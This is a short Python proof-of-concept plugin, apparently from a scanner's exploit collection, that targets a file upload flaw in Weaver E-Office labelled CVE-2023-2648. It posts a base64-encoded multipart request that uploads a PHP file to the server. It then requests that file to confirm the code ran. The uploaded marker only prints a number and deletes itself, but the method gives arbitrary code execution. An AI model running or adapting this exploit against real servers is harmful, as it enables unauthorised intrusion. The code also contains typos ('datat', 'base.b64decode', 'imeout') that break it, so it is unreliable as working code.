#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import base64
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '泛微 E-Office文件上传漏洞(CVE-2023-2648)',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      }
  target = '/inc/jquery/uploadify/uploadify.php'
  data = 'LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZFJWQ0dXcTRDeDNTcTZ0dApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkZkaWxlZGF0YSI7IGZpbGVuYW1lPSI0NDQucGhwLiIKQ29udGVudC1UeXBlOiBpbWFnZS9qcGVnCiAKPD9waHAgcHJpbnQoMjU2KiAyNTYpOyB1bmxpbmsoX19GSUxFX18pOz8+Ci0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWRSVkNHV3E0Q3gzU3E2dHQ='
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,datat=base.b64decode(data),imeout=5,verify=False)
    if res.status_code == 200:
      matches = re.findall(r"(\d{10})", res.text)
      vurl = url + "/attachment/" + matches[0] + "/444.php"
      resp = requests.get(vurl)
      if resp.status_code == 200 and '65536' in resp.text:
        # ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret